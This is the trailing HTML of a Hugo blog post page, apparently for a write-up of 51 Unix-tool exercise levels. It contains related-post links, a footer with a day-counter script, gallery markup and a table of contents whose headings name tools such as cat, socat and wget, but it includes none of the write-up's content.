+                    
+<article class="has-image">
+    <a href="/post/csapp-labs/">
+        
+        
+            <div class="article-image">
+                <img src="/post/csapp-labs/cover.60f2c68d83d56007c5960ebcac35cd70_hu3b8d692d45d6b215e59701d25ac88074_3319905_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSAPP Labs"
+                        
+                        data-hash="md5-YPLGjYPVYAfFlg68rDXNcA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSAPP Labs</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/qwb2022-rev-writeups/">
+        
+        
+            <div class="article-image">
+                <img src="/post/qwb2022-rev-writeups/cover.857debcd860ee83d948aabfb4115b280_huf3a3154eb771834b8e58d0981851333b_950314_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post qwb 2022 rev writeups"
+                        
+                        data-hash="md5-hX3rzYYO6D2Uiqv7QRWygA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">qwb 2022 rev writeups</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2023 s0uthwood&#39;s Blog
+    
+        
+            <br />
+            已运行 <i class="fas fa-bell"></i> <a id="days">0</a> 天
+        
+    
+        
+            &nbsp;&nbsp;
+            
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+            
+            ⌨&nbsp;
+            97.71k&nbsp;
+            字
+            &nbsp;&nbsp;
+            🧠&nbsp;
+            41&nbsp;
+            篇文章
+        
+    </section>
+
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+
+    
+        <script>
+            var s1 = "2020-11-15";
+            s1 = new Date(s1.replace(/-/g, "/"));
+            s2 = new Date();
+            var days = s2.getTime() - s1.getTime();
+            var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+            document.getElementById('days').innerHTML = number_of_days;
+        </script>
+    
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#level1-cat">level1 cat</a></li>
+    <li><a href="#level2-more">level2 more</a></li>
+    <li><a href="#level3-less">level3 less</a></li>
+    <li><a href="#level4-tail">level4 tail</a></li>
+    <li><a href="#level5-head">level5 head</a></li>
+    <li><a href="#level6-sort">level6 sort</a></li>
+    <li><a href="#level7-vim">level7 vim</a></li>
+    <li><a href="#level8-emacs">level8 emacs</a></li>
+    <li><a href="#level9-nano">level9 nano</a></li>
+    <li><a href="#level10-rev">level10 rev</a></li>
+    <li><a href="#level11-od">level11 od</a></li>
+    <li><a href="#level12-hd">level12 hd</a></li>
+    <li><a href="#level13-xxd">level13 xxd</a></li>
+    <li><a href="#level14-base32">level14 base32</a></li>
+    <li><a href="#level15-base64">level15 base64</a></li>
+    <li><a href="#level16-split">level16 split</a></li>
+    <li><a href="#level17-gzip">level17 gzip</a></li>
+    <li><a href="#level18-bzip2">level18 bzip2</a></li>
+    <li><a href="#level19-zip">level19 zip</a></li>
+    <li><a href="#level20-tar">level20 tar</a></li>
+    <li><a href="#level21-ar">level21 ar</a></li>
+    <li><a href="#level22-cpio">level22 cpio</a></li>
+    <li><a href="#level23-genisoimage">level23 genisoimage</a></li>
+    <li><a href="#level24-env">level24 env</a></li>
+    <li><a href="#level25-find">level25 find</a></li>
+    <li><a href="#level26-make">level26 make</a></li>
+    <li><a href="#level27-nice">level27 nice</a></li>
+    <li><a href="#level28-timeout">level28 timeout</a></li>
+    <li><a href="#level29-stdbuf">level29 stdbuf</a></li>
+    <li><a href="#level30-setarch">level30 setarch</a></li>
+    <li><a href="#level31-watch">level31 watch</a></li>
+    <li><a href="#level32-socat">level32 socat</a></li>
+    <li><a href="#level33-whiptail">level33 whiptail</a></li>
+    <li><a href="#level34-awk">level34 awk</a></li>
+    <li><a href="#level35-sed">level35 sed</a></li>
+    <li><a href="#level36-ed">level36 ed</a></li>
+    <li><a href="#level37-chown">level37 chown</a></li>
+    <li><a href="#level38-chmod">level38 chmod</a></li>
+    <li><a href="#level39-cp">level39 cp</a></li>
+    <li><a href="#level40-mv">level40 mv</a></li>
+    <li><a href="#level41-perl">level41 perl</a></li>
+    <li><a href="#level42-python">level42 python</a></li>
+    <li><a href="#level43-ruby">level43 ruby</a></li>
+    <li><a href="#level44-bash">level44 bash</a></li>
+    <li><a href="#level45-date">level45 date</a></li>
+    <li><a href="#level46-dmesg">level46 dmesg</a></li>
+    <li><a href="#level47-wc">level47 wc</a></li>
+    <li><a href="#level48-gcc">level48 gcc</a></li>
+    <li><a href="#level49-as">level49 as</a></li>
+    <li><a href="#level50-wgetunsolved">level50 wget(unsolved)</a></li>
+    <li><a href="#level51-ssh-keygenunsolved">level51 ssh-keygen(unsolved)</a></li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
